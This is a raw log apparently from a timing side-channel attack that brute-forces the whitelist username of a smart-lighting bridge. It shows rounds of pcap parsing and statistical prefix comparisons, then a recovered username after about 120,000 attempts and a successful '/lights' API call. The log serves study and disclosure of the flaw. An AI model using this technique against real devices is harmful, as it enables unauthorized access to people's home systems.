6360  6366  0.54858231956
6360  6365  0.649355901016
6360  6364  0.15464339125
6367  6366  0.890571164905
6367  6365  0.574263857159
6367  6364  0.334954052477
6366  6365  0.977999090695
6366  6364  0.31867225363
6365  6364  0.298941086972
{'6361': 1, '6362': 1, '6364': 2}
Collecting data:
114100 1970.960833 34.927214
114200 1972.640755 59.526570
114300 1974.320634 59.528099
114400 1976.001260 59.501633
114500 1977.675791 59.718214
114600 1979.352002 59.658365
114700 1981.031968 59.525015
114800 1982.711848 59.528056
114900 1984.392225 59.510455
115000 1986.072467 59.515243
115100 1987.746381 59.740219
115200 1989.423206 59.636522
115300 1992.108371 37.241657
115400 1993.783278 59.704809
115500 1995.461457 59.588398
115600 1997.141343 59.527854
115700 1998.821151 59.530608
115800 2000.501327 59.517574
115900 2002.178728 59.616043
116000 2003.852580 59.742440
116100 2005.531676 59.555848
116200 2007.211526 59.529129
116300 2008.891323 59.531005
116400 2010.572119 59.495615
116500 2012.248387 59.656337
116600 2013.923160 59.709585
116700 2015.603420 59.514593
116800 2017.283305 59.527888
116900 2018.963274 59.524905
117000 2020.643244 59.524872
Current guess:  636
Parsing data...
Parsing  data/2014-10-30-16-15-49.pcap
Parsing  data/2014-10-30-16-16-04.pcap
Parsing  data/2014-10-30-16-16-19.pcap
Calculating next guess...
Key Count (Number of loaded samples)
6363 2494
6362 2497
6361 2496
6360 2498
6367 2497
6366 2498
6365 2498
6364 2496
k1 k2 p
6363  6362  0.762967798774
6363  6361  0.873425074913
6363  6360  0.987036306602
6363  6367  0.232395852092
6363  6366  0.624024950795
6363  6365  0.69565221258
6363  6364  0.0810516105287
6362  6361  0.898107488074
6362  6360  0.905237455688
6362  6367  0.0637385360771
6362  6366  0.325435674927
6362  6365  0.4038653277
6362  6364  0.00592997719193
6361  6360  0.942034105787
6361  6367  0.463390519009
6361  6366  0.655441573815
6361  6365  0.540516364111
6361  6364  0.0120131726822
6360  6367  0.144727155112
6360  6366  0.501857304153
6360  6365  0.694472564726
6360  6364  0.05554229189
6367  6366  0.896222851104
6367  6365  0.533646127646
6367  6364  0.28450176238
6366  6365  0.98422532099
6366  6364  0.277495271317
6365  6364  0.0983275857277
{'6360': 1, '6361': 1, '6362': 2, '6363': 1, '6364': 5, '6365': 1, '6367': 1}
Collecting data:
117100 2023.427298 35.918846
117200 2025.107624 59.512253
117300 2026.787708 59.520834
117400 2028.463517 59.672675
117500 2030.138528 59.701103
117600 2031.818385 59.528876
117700 2033.498557 59.517717
117800 2035.178202 59.536388
117900 2036.858853 59.500755
118000 2038.533729 59.705913
118100 2040.210931 59.623102
118200 2041.891870 59.490560
118300 2043.571856 59.524306
118400 2045.252112 59.514745
118500 2046.929801 59.605800
118600 2048.603519 59.747222
118700 2050.282169 59.571683
118800 2051.962101 59.526215
118900 2053.642051 59.525581
119000 2055.322740 59.499413
119100 2056.999591 59.635590
119200 2058.673515 59.739870
119300 2060.352773 59.550107
119400 2062.032669 59.527499
119500 2063.712670 59.523773
119600 2065.392391 59.533692
119700 2067.068015 59.679264
119800 2068.742905 59.705412
119900 2070.423313 59.509357
120000 2072.103434 59.519525
Current guess:  636
Parsing data...
Parsing  data/2014-10-30-16-16-34.pcap
Parsing  data/2014-10-30-16-16-49.pcap
Parsing  data/2014-10-30-16-17-04.pcap
Parsing  data/2014-10-30-16-17-19.pcap
Calculating next guess...
Key Count (Number of loaded samples)
6363 2933
6362 2935
6361 2935
6360 2936
6367 2936
6366 2936
6365 2936
6364 2935
k1 k2 p
6363  6362  0.761138132252
6363  6361  0.68357135898
6363  6360  0.83843502346
6363  6367  0.114431190183
6363  6366  0.305198893103
6363  6365  0.948575083286
6363  6364  0.0259911126473
6362  6361  0.956242410692
6362  6360  0.752922207806
6362  6367  0.0490721656911
6362  6366  0.219676081151
6362  6365  0.822313679666
6362  6364  0.000567947481722
6361  6360  0.876719538663
6361  6367  0.0941000662877
6361  6366  0.41249052957
6361  6365  0.702018683809
6361  6364  0.000315738111513
6360  6367  0.0711640786013
6360  6366  0.282821494422
6360  6365  0.739459837899
6360  6364  0.00351116151367
6367  6366  0.789351923155
6367  6365  0.256075887281
6367  6364  0.262852148143
6366  6365  0.672241455531
6366  6364  0.0860535011582
6365  6364  0.0092526116576
{'6360': 2,
 '6361': 2,
 '6362': 2,
 '6363': 1,
 '6364': 6,
 '6365': 1,
 '6366': 1,
 '6367': 3}
CHANGING GUESS:  6364
Guess time:  414.772190809
mkdir -p data
mkdir -p tmp
rm -rf data/*
rm -rf tmp/*
rm -rf *.pyc
Collecting data:
Making new username generators with prefix: 6364
120100 2075.109111 33.270375
120200 2076.785340 59.657720
120300 2078.465515 59.517607
120400 2080.145662 59.518604
================================================================================

Found correct username:  6364670773
Elapsed time:  34.6935308139 min
Total Attempts:  120487
================================================================================
Searching for lights
[{u'success': {u'/lights': u'Searching for new devices'}}]

(no delay)